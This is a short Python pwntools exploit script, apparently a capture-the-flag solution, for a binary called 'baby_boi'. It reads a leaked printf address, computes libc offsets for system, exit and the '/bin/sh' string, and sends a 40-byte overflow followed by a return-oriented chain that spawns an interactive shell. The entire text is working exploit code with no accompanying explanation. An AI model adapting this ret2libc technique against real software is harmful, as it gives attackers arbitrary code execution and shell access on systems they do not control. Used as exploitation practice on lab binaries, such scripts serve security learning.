from pwn import * 

#gdbcmd = "b * 0x000000000040070d"
#target = gdb.debug("./baby_boi", gdbcmd)
target = process("./baby_boi")
target.recvuntil("am: ")
printf = int(target.recvuntil("00"), 16)
system = printf -  0x79b0
exit = system - 0x10bb0
bin_sh = printf + 0x16b32f
payload = b""

payload += b"A" * 40
payload += p64(0x0000000000400793)
payload += p64(bin_sh)
payload += p64(system + 44)
payload += p64(system)
payload += p64(exit)
target.sendline(payload)

target.interactive() #0x00007ffff7c60100